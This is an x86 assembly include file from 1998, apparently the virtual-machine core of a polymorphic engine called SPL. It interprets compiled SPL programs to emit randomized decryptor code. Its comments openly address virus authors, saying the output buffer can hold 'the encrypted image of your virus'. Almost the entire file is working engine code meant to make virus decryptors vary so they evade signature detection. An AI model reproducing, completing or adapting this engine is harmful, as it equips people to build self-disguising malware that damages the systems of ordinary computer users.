   ;   SPL for Windows V2.20
   ;   (c)1998 by ANAkTAS
   ;
   ;   Description :
   ;   This file contain the <splVM> routine.
   ;   Copy this function to your source file or put the command:
   ;   "INCLUDE splVM.inc" in your source file.
   ; ------------------------------------------------------------


   ;;--Usage of registers--
   ;;BP=instraction size
   ;;AL=current instruction
   ;;AH=Return value
   ;;SI=pointer to the current SPL instruction
   ;;CX,DX=The math qeue. CX is Math qeue 1, DX is Math qeue 2
   ;;
   ;;
   ;;Variables
   ;;0000 SPL BUFFER POINTER
   ;;0002 Math qeue 3
   ;;0004 Math qeue 4
   ;;0006 Math qeue 5
   ;;0008 randvar
   ;------------------------------------------------------


   ;Fuction name:<sple>
   ;Description: The SPL Engine.
   ;Input:
   ;DX:SI  = segment and offset of your engine's data. That's
   ;         the data table created by the SPL compiler.
   ;ES:0000= Segment adress of a reserved memory block.
   ;     This is for internal use by splVM. (variables,uncompressed code,etc)
   ;         This memory block, must first be initialized
   ;         with <splrand> fuction.
   ;DS:0000= Segment adress of the second memory block.
   ;         Its the buffer where your SPL program will put
   ;         the decryptor and possible you would also like
   ;         to put there the encrypted image of your virus.
   ;         So, the size of this buffer depents on you.
   ;Output:
   ;         Registers and Flags are not effected.
   ;         DS:0000-???? buffer will contain the generated decryptor.
   ;         ES:0000-0511 will contain the variables.
   ;         the rest ES:512-???? will contain garbage.
   ;------------------------------------------------------
   splvm    PROC NEAR

   ;Save registers AX,BX,CX,DX,SI,DI
   ;( 7 bytes long )
               PUSHF
               PUSH AX
               PUSH BX
               PUSH CX
               PUSH DX
               PUSH SI
               PUSH DI

   ;decompress data table from DX:SI to DS:0200h
   ;( 50 bytes long )
               PUSH DS
               PUSH DX
               POP DS
           Lodsw
           mov cx,ax
               MOV DI,512
               MOV DL,DS:[SI]
               INC SI
           cld
   spldecompress0: Lodsw
           cmp al,dl
           jz spldecompress1
           dec si
   spldecompress2: stosb
           loop spldecompress0
           jmp spldecompress4
   spldecompress1: cmp ah,0
                   jz spldecompress2
           mov bx,di
           sub bx,ds:[si]
           add si,2
   spldecompress3: MOV AL,ES:[bx]
               INC bx
               MOV ES:[DI],AL
               INC DI
           dec ah
                   jnz spldecompress3
           loop spldecompress0
   spldecompress4: POP DS

           PUSH DS  ;exchge DS,ES
           Push ES
           POP  DS
           POP  ES




   ;initialize registers and call the interpreter
               MOV SI,512
               MOV WORD PTR DS:[0],0 ; IP=0 STARTING VALUE
               CALL spltranslateinstr
           PUSH DS  ;exchge DS,ES
           Push ES
           POP  DS
           POP  ES

   ;Restore AX,BX,CX,DX,SI.DI
               POP DI
               POP SI
               POP DX
               POP CX
               POP BX
               POP AX
               POPF
               RET  ;exit


   spltranslateinstr:
           PUSH SI
                   IN AL,40h
                   MOV AH,AL
                   IN AL,40h
                   MOV DS:[0008],AX
           XOR AH,AH
           MOV AL,DS:[SI]

   ;decode instruction "ALL"
   splall:
           CMP AL,251  ;VI_All
                   JNZ splshift
                   INC SI
   splall1:    MOV AL,[SI]
                   CMP AL,234  ;VI_End
                   JnZ  splall2
           pop si
           push si
                   jmp splnopping
   splall2:        call spltranslateinstr
           TEST AH,AH
                   JZ splall2
               CALL splgetinstrsize
               ADD SI,BP
               JMP splall1


   ;decode instruction "SHIFT"
   splshift:
           CMP AL,253  ;VI_SHIFT
                   JNZ spliszero
           INC SI
   splshift1:      MOV AL,DS:[SI]
           CMP AL,235 ; VI_Noop
               JZ splshift3
               CMP AL,250 ;VI_NoopM
               JZ splshift3
                   CMP AL,234  ;VI_End
                   JNZ splshift2
           pop si
           push si
           jmp splnopping
   splshift2:  call spltranslateinstr
           xor ah,ah
               POP SI
               RET
   splshift3:  CALL splgetinstrsize
               ADD SI,BP
               JMP splshift1


   ;//////////////
   ;decode instruction "ISZERO"
   spliszero:
   spl1iszero: CMP AL,254 ;VI_ISZERO
               JNZ splselect
           mov DI,ds:[si+1]
           and di,00ffh
           ADD DI,DI
           MOV AX,DS:[DI]
           CMP AX,0
           JZ splselectagain2
           MOV AL,01
           JMP splselectagain2

   ;//////////////
   ;decode instruction "SELECT"
   splselect:
   spl5select: CMP AL,255 ;VI_SELECT
               JNZ splrandom
   splselectagain: mov DI,ds:[si+1]
           and di,00ffh
           ADD DI,DI
           MOV AL,DS:[DI]
   splselectagain2:POP si
               PUSH SI
               ADD SI,2
               XOR BL,BL
   splselectnext:  cmp byte ptr ds:[SI],234 ;VI_End
               jz splselectdiv
               cmp byte ptr ds:[SI],250 ;VI_NoopM
               jz splselectpass
               CMP AL,BL
               JZ splselectexec
               INC BL
   splselectpass:  push ax
           call splgetinstrsize
               add SI,BP
           pop ax
               JMP splselectnext
   splselectdiv:   TEST BL,BL
               JnZ splselectdiv2
           pop si
           push si
           jmp splnopping
   splselectdiv2:  XOR AH,AH
           DIV BL
               MOV AL,AH
               JMP splselectagain2
   splselectexec:  call spltranslateinstr
           test ah,ah
           jz splselectexit
           pop si
           push si
           jmp splnopping
   splselectexit:  pop si
           ret
   ;//////////////




   ;decode instruction "RANDOM"
   splrandom:
   spl5:           CMP AL,252  ;VI_RANDOM
               JNZ spl_NoopM

   spl5again:  IN AL,40h
   spl5again2: POP si
               PUSH SI
               ADD SI,1
               XOR Bx,Bx
   spl5next:
               cmp byte ptr ds:[SI],234 ;VI_End
               jz spl5div
               cmp byte ptr ds:[SI],250 ;VI_NoopM
               jz spl5pass
               cmp byte ptr ds:[SI],235 ;VI_Noop
               jz spl5pass
               CMP AL,BL
               JZ spl5exec
               INC BL
   spl5pass:   push ax
           call splgetinstrsize
               add SI,BP
           pop ax
               JMP spl5next
   spl5div:    TEST BL,BL
               JnZ spl5div2
           pop si
           push si
           jmp splnopping
   spl5div2:       XOR AH,AH
           DIV BL
               MOV AL,AH
               JMP spl5again2
   spl5exec:   call spltranslateinstr
           xor ax,ax
           pop si
           ret


   ;decode instruction "NOOP multiple"
   spl_NoopM:
   spl6:       CMP AL,250 ;VI_NoopM
               JNZ spl_Noop
           jmp splnopping


   ;decode instruction "NOOP"
   spl_Noop:
   spl7:       CMP AL,235 ;VI_Noop
               JNZ spl_End
           jmp splnopping


   ;decode instruction "END"
   spl_End:
   spl8:       CMP AL,234 ;VI_End
               JNZ spl_PopVariable
           POP SI
               POP SI
               POP SI
           POP SI
               PUSH SI
               ret

   ;decode instruction "PopVariable"
   spl_PopVariable:CMP AL,246 ;VI_PopVariable
               JNZ spl_Add
           MOV DI,DS:[SI+1]
               AND DI,00FFh
           ADD DI,DI
               MOV DS:[DI],CX
               JMP popqeue



   ;decode instruction "ADD"
   spl_Add:
   spl11:      CMP AL,243 ;VI_Add
               JNZ spl_Sub
           ADD DX,CX
           jmp popqeue


   ;decode instruction "SUB"
   spl_Sub:
   spl13:      CMP AL,242 ;VI_Sub
               JNZ spl_Xor
           SUB DX,CX
           jmp popqeue


   ;decode instruction "XOR"
   spl_Xor:
   spl15:      CMP AL,240 ;VI_XOR
               JNZ spl_PopEmit
           XOR DX,CX
               JMP  popqeue

   ;decode instruction "PopEmit"
   spl_PopEmit:
   spl16:      CMP AL,236 ;VI_PopEmit
               JNZ spl_And
           MOV DI,DS:[0]
               MOV ES:[DI],CL
               INC WORD PTR DS:[0]
               JMP  popqeue

   ;decode instruction "AND"
   spl_And:
   spl17:      CMP AL,241 ;VI_And
               JNZ spl_Or
           AND DX,CX
               JMP  popqeue

   ;decode instruction "OR"
   spl_Or:
   spl18:          CMP AL,239 ;VI_Or
                   JNZ spl_ShiftL
           OR DX,CX
               JMP  popqeue

   ;decode instruction "Shift left"
   spl_ShiftL:
   spl19:          CMP AL,238 ;VI_ShiftL
               JNZ spl_ShiftR
           SHL DX,CL
               JMP  popqeue

   ;decode instruction "Shift right"
   spl_ShiftR:
   spl20:      CMP AL,237 ;VI_ShiftR
                   JNZ spl_PushValueW
           SHR DX,CL
               JMP  popqeue


   ;decode instruction "Push ValueW"
   spl_PushValueW:
   spl21:      CMP AL,249 ;VI_PushValueW
               JNZ spl_PushVariable
               xchg DX,ds:[0002]  ;shift the math queue
           xchg DX,ds:[0004]
                   mov ds:[0006],DX
           mov dx,cx
           MOV CX,DS:[SI+1] ;get the value
           JMP splnopping

   ;decode instruction "Push variable"
   spl_PushVariable:
   spl22:      CMP AL,247 ;VI_PushVariable
               JNZ spl_EmitVariable
           MOV DI,DS:[SI+1]
               AND DI,00FFh
           ADD DI,DI
               xchg DX,ds:[0002]  ;shift the math queue
           xchg DX,ds:[0004]
                   mov ds:[0006],dx
           mov dx,cx
           MOV CX,DS:[DI]
           JMP splnopping


   ;Pop 1 item from Math queue
   popqeue:
           mov cx,ds:[6]
                   xchg cx,ds:[4]
                   xchg cx,ds:[2]
                   xchg cx,dx
           JMP splnopping

   ;decode instruction "EMIT variable"
   spl_EmitVariable:
   spl23:          CMP AL,245   ;VI_EmitVariable
               JNZ spl_EmitValueB
               MOV DI,DS:[SI+1]
           AND DI,00FFh
           ADD DI,DI
           MOV AL,DS:[DI]
               JMP spl25

   spl_EmitValueB:
   spl24:      CMP AL,244 ;VI_EmitValueB
               JNZ spl_EmitValueB0
               MOV AL,DS:[SI+1]
   spl_EmitValueB0:
   spl25:      MOV DI,DS:[0]
               MOV ES:[DI],AL
               INC WORD PTR DS:[0]
               JMP splnopping




   splnopping:
           CALL splgetinstrsize
           MOV AH,0FFh
           DEC BP
           JZ splonenop

           MOV byte PTR DS:[SI],250  ;VI_NoopM
       push bp
   splnopinside:
           MOV BYTE PTR DS:[SI+BP],235  ;VI_Noop
       dec bp
       jnz splnopinside
       pop bp
           MOV BYTE PTR DS:[SI+BP],234  ;VI_End
           JMP splreturn

   splonenop:
           MOV BYTE PTR DS:[SI],235  ;VI_Noop

   splreturn:
   splreturning:
               POP SI
               RET



   ;BP= returns the size of instruction on DS:[SI]

   splgetinstrsize:  xor di,di
             xor bp,bp
   splgetinstrsize4: mov al,DS:[si+bp]
             inc bp
             CMP AL,250
             JB splgetinstrsize2
             cmp al,254
             jnz splgetinstrsize3
             inc bp
   splgetinstrsize3: inc di
   splgetinstrsize6: call splgetinstrsize4
             cmp di,0
             jnz splgetinstrsize6
             ret

   splgetinstrsize2: cmp al,234
             jnz splgetinstrsize5
             dec di
   splgetinstrsize5:
             cmp al,244
             jb splgetinstrsize1
             inc bp
             cmp al,249
             jb splgetinstrsize1
             inc bp
   splgetinstrsize1: ret


   splvm   ENDP
   ;------------------------------------------------------
